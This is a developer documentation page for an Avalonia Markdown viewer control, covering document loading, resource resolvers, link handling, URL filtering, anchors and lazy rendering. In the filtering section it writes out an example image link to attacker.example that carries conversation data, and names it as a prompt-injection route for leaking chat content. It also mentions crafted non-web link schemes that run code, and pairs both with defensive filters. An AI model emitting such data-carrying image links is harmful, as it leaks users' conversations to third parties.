---
title: "Displaying documents"
---

# Displaying documents

Give the viewer its text with `Markdown`, or a location to load it from with `Source`:

```xml
<mv:MarkdownViewer Markdown="{Binding Notes}" />
<mv:MarkdownViewer Source="avares://MyApp/Docs/guide.md" />
```

Setting either renders the whole document again and scrolls back to the top. To show text that grows at its end, such as the answer of a language model, use a [streaming session](streaming.md) instead.

## Loading a file or a URL

`Source` loads the document from an embedded resource, a file or the web:

```csharp
viewer.Source = new Uri("avares://MyApp/Docs/guide.md");
viewer.Source = new Uri("/home/user/documents/notes.md");
viewer.Source = new Uri("https://example.com/readme.md");
viewer.Source = null;   // back to the Markdown property
```

| Scheme | Loading | Notes |
|--------|---------|-------|
| `avares://` | Synchronous | `ManifestResourceStream`, already in memory |
| `file://` | Async | Local and network paths |
| `http`, `https` | Async | The request is cancelled when `Source` changes; a response over 64 MB is not loaded (remote images too) |
| Any other | Through [`ResourceResolver`](#reading-from-your-own-storage) | Synchronous when the resolver's task has already completed |

- When both are set, `Source` wins over `Markdown`.
- A document that cannot be loaded (missing, forbidden, a scheme nothing opens) leaves the current document on screen.
- The base address for relative links and images is the folder of `Source`, unless `BaseUri` is set.
- A `#fragment` scrolls to that anchor once the document is rendered: `new Uri(path + "#installation")` behaves like setting `Source` and then calling `ScrollToAnchor("installation")`, without waiting for the render.
- For `avares://`, everything after the first `#` is the fragment, so an asset whose path contains `#` (such as `Docs/C#.md`) cannot be loaded through `Source`. Rename it, or read it with `AssetLoader.Open` and set `Markdown`.

## Reading from your own storage

The viewer reads `avares://`, `file://` and `http(s)://` by itself. For anything else (a zip archive, a database, files the application keeps in its own storage, a server that needs credentials), give it an `IResourceResolver`. It opens both the document of `Source` and every image of the document, so a document from a zip archive shows the images stored next to it:

```csharp
using System.IO.Compression;
using MarkView.Avalonia.Extensions;

/// Serves the entries of a zip archive as zip://manual/<path>.
public sealed class ZipResolver(ZipArchive archive) : IResourceResolver
{
    private readonly Lock _gate = new(); // a ZipArchive cannot be read from two threads at once

    public Task<Stream?> OpenAsync(Uri uri, CancellationToken cancellationToken = default)
    {
        if (uri is not { Scheme: "zip", Host: "manual" })
            return Task.FromResult<Stream?>(null); // not ours: the viewer opens it itself

        lock (_gate)
        {
            var entry = archive.GetEntry(Uri.UnescapeDataString(uri.AbsolutePath.TrimStart('/')))
                ?? throw new FileNotFoundException(null, uri.AbsolutePath);
            var copy = new MemoryStream();
            using (var stream = entry.Open())
                stream.CopyTo(copy);
            copy.Position = 0;
            return Task.FromResult<Stream?>(copy);
        }
    }
}

viewer.ResourceResolver = new ZipResolver(ZipFile.OpenRead("manual.zip"));
viewer.Source = new Uri("zip://manual/guide/index.md"); // ![](../img/a.png) reads zip://manual/img/a.png
```

- The resolver gets absolute addresses without their fragment: relative ones are resolved first against [`BaseUri`](#relative-links-and-images), or the folder of `Source`. Any scheme that looks like a URL (`scheme://host/path`) resolves relative paths as `http` does. Images given as `data:` URIs never reach it.
- Return `null` for an address the resolver does not handle: the viewer then opens it itself. Throw (or fail the task) for one it handles but cannot read: the image shows its [placeholder](images.md#images-that-fail-to-load) and a `Source` keeps the current document.
- A task that has already completed when it is returned, as above, renders `Source` before the property setter returns, as for `avares://`.
- It can be called from any thread and for several images at once. The viewer disposes of the streams it gets.
- Setting `ResourceResolver` loads `Source` again and re-renders the document. `MarkdownViewerDefaults.ResourceResolver` applies to every viewer that has none of its own.

The same hook covers servers that need credentials, through an `HttpClient` set up for them:

```csharp
public sealed class IntranetResolver(HttpClient client) : IResourceResolver
{
    public async Task<Stream?> OpenAsync(Uri uri, CancellationToken cancellationToken = default) =>
        uri.Host == "docs.intranet.example"
            ? await client.GetStreamAsync(uri, cancellationToken) // client sends the Authorization header
            : null;
}
```

[Custom image loaders](custom-extensions.md#writing-a-custom-image-loader) read through the resolver too when they implement the `LoadAsync` overload that takes one, as the built-in and SVG loaders do.

## Relative links and images

`BaseUri` resolves relative links and image addresses when the text does not come from `Source`, or overrides the folder of `Source`:

```csharp
viewer.BaseUri = new Uri("https://raw.githubusercontent.com/org/repo/main/docs/");
viewer.Markdown = File.ReadAllText("README.md");
```

## Links

Clicking a link opens it with the platform's launcher: the default browser on the desktop, an intent on mobile, a new tab in the browser. Only `http`, `https` and `mailto` links are opened this way (see [Links the viewer opens](#links-the-viewer-opens)). Links to an anchor of the document (`#heading`) scroll to it.

`LinkClicked` is raised first, so an application can handle some links itself. Set `e.Handled` to stop the default launch:

```csharp
viewer.LinkClicked += (_, e) =>
{
    if (e.Url.EndsWith(".md"))
    {
        viewer.Source = new Uri(e.Url);   // open the linked document in place
        e.Handled = true;
    }
};
```

`LinkClicked` is a routed event that bubbles, so a class handler registered once handles every viewer:

```csharp
MarkdownViewer.LinkClickedEvent.AddClassHandler<MarkdownViewer>((viewer, e) =>
{
    // e.Url is the address as written, possibly relative ("#section")
});
```

The event is raised for every link, anchor links included; the viewer has already scrolled to an anchor before raising it, and never launches one.

### Links the viewer opens

The launcher hands a URL to whatever the operating system registered for its scheme. For a `file:` link that can be a program, and installer or settings protocols (`ms-appinstaller:`, `ms-settings:`, …) do more than show a page: that is how a crafted link in a Markdown file could run code in Windows Notepad ([CVE-2026-20841](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)). So the viewer launches only the schemes in `MarkdownViewerDefaults.LaunchableLinkSchemes`: `http`, `https` and `mailto` by default, compared without regard to case.

A link of any other scheme (or a relative one) still raises `LinkClicked`, so the application can open its own links:

```csharp
viewer.LinkClicked += (_, e) =>
{
    if (e.Url.StartsWith("myapp://"))
    {
        Router.Navigate(e.Url);
        e.Handled = true;
    }
};
```

Add a scheme to the set only when the documents shown are trusted:

```csharp
MarkdownViewerDefaults.LaunchableLinkSchemes.Add("file"); // e.g. a viewer of the user's own notes
```

## Filtering links and images

`UrlTransform` rewrites or drops the URL of every link and image while the document renders. It gets the URL resolved against [`BaseUri`](#relative-links-and-images) (or the folder of `Source`), and whether it is the target of a link or the address of an image, and returns the URL to use, or `null` to drop it:

- A dropped link renders as its text alone, with its formatting but no link: nothing to click, no Tab stop.
- A dropped image shows its [placeholder](images.md#images-that-fail-to-load) with its alt text, and is never loaded.

This matters most for text the application does not control, such as a language model's answers. A document can make the viewer fetch any image URL it likes, and the request itself can carry data: `![](https://attacker.example/pixel.png?q=<something from the conversation>)` is a known way of leaking a chat's content through a prompt injection. Allow images from known hosts only:

```csharp
viewer.UrlTransform = (url, kind) =>
    kind == MarkdownUrlKind.Image
    && !(Uri.TryCreate(url, UriKind.Absolute, out var uri) && uri.Host == "cdn.myapp.example")
        ? null
        : url;
```

Or rewrite them, e.g. through an image proxy:

```csharp
viewer.UrlTransform = (url, kind) => kind == MarkdownUrlKind.Image
    ? "https://proxy.myapp.example/?url=" + Uri.EscapeDataString(url)
    : url;
```

- Links include autolinks (an e-mail one comes as `mailto:…`), HTML `<a href>` and video links; images include HTML `<img src>` and video thumbnails. A video whose link is dropped shows the image placeholder.
- Same-document anchors (`#heading`) and footnote links never reach the transform.
- A URL stays relative when there is neither `BaseUri` nor `Source` to resolve it against.
- While [streaming](streaming.md), the links and images of the block still being written ([provisional](streaming.md#provisional-rendering)) are not given to the transform: it is called once their block is complete.
- Setting `UrlTransform` re-renders the document. `MarkdownViewerDefaults.UrlTransform` applies to every viewer that has none of its own.

The transform decides what the document shows; [`LaunchableLinkSchemes`](#links-the-viewer-opens) still decides which of the remaining links the viewer opens by itself.

## Anchors

`ScrollToAnchor` scrolls to a heading or a footnote:

```csharp
viewer.ScrollToAnchor("installation");   // "## Installation"
viewer.ScrollToAnchor("fn-1");           // footnote [^1]
```

Anchors follow GitHub's rules: the heading's text in lower case, spaces turned into hyphens, other punctuation removed. A heading whose anchor is already taken gets a suffix (`-1`, `-2`…). A heading inside a collapsed alert, details block or [heading section](folding.md) is expanded before the viewer scrolls to it.

### Smooth scrolling

With `IsSmoothScrollingEnabled`, a jump to an anchor (a `#anchor` link, a footnote reference, `ScrollToAnchor`) is animated instead of immediate:

```xml
<Style Selector="mv|MarkdownViewer">
  <Setter Property="IsSmoothScrollingEnabled" Value="True" />
</Style>
```

The animation takes longer for a longer jump, as in a browser: from 150 ms for a short one to 500 ms at most. A jump of more than about 3,900 px goes at once to that distance from the anchor and animates the rest. The animation follows its target if content above it changes height, and stops as soon as anything else scrolls the document (the wheel, the scroll bar, the keyboard). Opening a document at a fragment still shows the anchor at once. Avalonia has no reduced-motion setting, so an application that has one can bind this property to it.

## Table of contents

`TableOfContents` lists the document's headings as a tree, to bind to your own side panel, menu or breadcrumb; the library has no table of contents control of its own:

```csharp
foreach (var entry in viewer.TableOfContents)
{
    Console.WriteLine($"{new string(' ', (entry.Level - 1) * 2)}{entry.Text}");
    // entry.Slug is the heading's anchor, for ScrollToAnchor
}
```

Each `TocEntry` has `Level`, `Text`, `Slug` and `Children`. `TableOfContentsMaxDepth` (6 by default, all levels) leaves out deeper headings:

```csharp
viewer.TableOfContentsMaxDepth = 2;   // h1 and h2 only
```

The list is rebuilt after every render. The [demo](https://github.com/Kryptos-FR/MarkView.Avalonia/tree/main/samples/MarkView.Avalonia.Demo) binds it to a side panel, a drop-down and a top bar.

## Lazy rendering

Some content costs far more to build than text: decoding an image, typesetting a formula, laying out a Mermaid diagram, colouring a code block. The viewer builds it when it first comes within one screen of the visible area, so a long document shows its first screen quickly and the parts nobody scrolls to cost nothing. On the desktop, Mermaid diagrams are rendered in the background as soon as the viewer is shown instead.

| Content | Before it comes near | Once it comes near |
|---|---|---|
| Image, YouTube thumbnail | Not loaded; an image already in the [image cache](images.md#image-cache) shows at once | Starts loading |
| Formula | Empty | Typeset |
| Mermaid diagram, in the browser | Empty | Rendered |
| Code block with syntax highlighting | Its text, uncoloured | Coloured |

The "before" column never shows on screen: content is built a screen ahead, and content already in view is built during the layout pass that first lays it out, before it is drawn. Images are the exception, since they still have to download. Find, selection and copy work on the whole document, built or not. A theme switch only rebuilds the content already built.

Content built while scrolling is often taller than the space it held, and so is a block a streaming session updates. When that happens above the part of the document in view, the viewer moves the scroll position by as much, as browsers do, so the text being read stays where it is. A heading reached with `ScrollToAnchor` or a match found with `FindNext` stays where it was shown while the content above it loads.

Turn it off for a viewer that must show everything without being scrolled, for example one rendered to a bitmap for printing:

```xml
<mv:MarkdownViewer IsLazyRenderingEnabled="False" />
```

With it off, formulas and colours are built during the render, and images and diagrams start loading as soon as the viewer is shown.

## Settings for every viewer

`MarkdownViewerDefaults` sets a pipeline and extensions for every viewer of the application:

```csharp
// App.axaml.cs, in OnFrameworkInitializationCompleted
MarkdownViewerDefaults.Pipeline = new MarkdownPipelineBuilder()
    .UseGitHubExtensions()
    .UseExtendedAlertBlocks()
    .Build();

MarkdownViewerDefaults.Extensions.AddTextMateHighlighting();
MarkdownViewerDefaults.Extensions.AddFenceRenderer("chart", (code, info) => new MyChart(code));
```

1. A viewer uses its own `Pipeline` if set, otherwise `MarkdownViewerDefaults.Pipeline`, otherwise the built-in default (`UseGitHubExtensions()`). `ResourceResolver` and `UrlTransform` fall back to `MarkdownViewerDefaults.ResourceResolver` and `MarkdownViewerDefaults.UrlTransform` the same way.
2. The default extensions are registered first, then the viewer's `Extensions`. An extension object in both lists is registered once.
3. For [fence renderers](code-blocks.md#custom-fenced-blocks), the last one registered for a language wins, so a viewer's own replaces a default one.

The other properties are styled properties, so a style sets them for every viewer:

```xml
<Style Selector="mv|MarkdownViewer">
  <Setter Property="ShowCodeBlockLanguage" Value="True" />
  <Setter Property="IsImageZoomEnabled" Value="True" />
</Style>
```

## Scrolling and the template

The theme's `ControlTemplate` puts the document in a `ScrollViewer` named `PART_ScrollViewer`:

```
Border → ScrollViewer (PART_ScrollViewer) → ContentPresenter
```

The usual `ScrollViewer` attached properties reach it, as with a `ListBox`:

```xml
<mv:MarkdownViewer ScrollViewer.VerticalScrollBarVisibility="Hidden" />
```

The horizontal scroll bar is disabled by default, which gives the document the viewer's width: images scale down and code blocks [wrap](code-blocks.md#line-numbers-wrapping-and-height) to it. With `ScrollViewer.HorizontalScrollBarVisibility="Auto"` (or `Visible`), wide content scrolls instead, code does not wrap, and images may no longer scale down to the viewer's width.

A template of your own can leave `PART_ScrollViewer` out. The document still renders, but `ScrollToAnchor()` falls back to `BringIntoView()`, and images no longer scale to the viewer's width unless the template constrains it:

```xml
<Style Selector="mv|MarkdownViewer">
  <Setter Property="Template">
    <ControlTemplate>
      <ScrollViewer Name="PART_ScrollViewer">
        <ContentPresenter Name="PART_ContentPresenter" Content="{TemplateBinding Content}" />
      </ScrollViewer>
    </ControlTemplate>
  </Setter>
</Style>
```
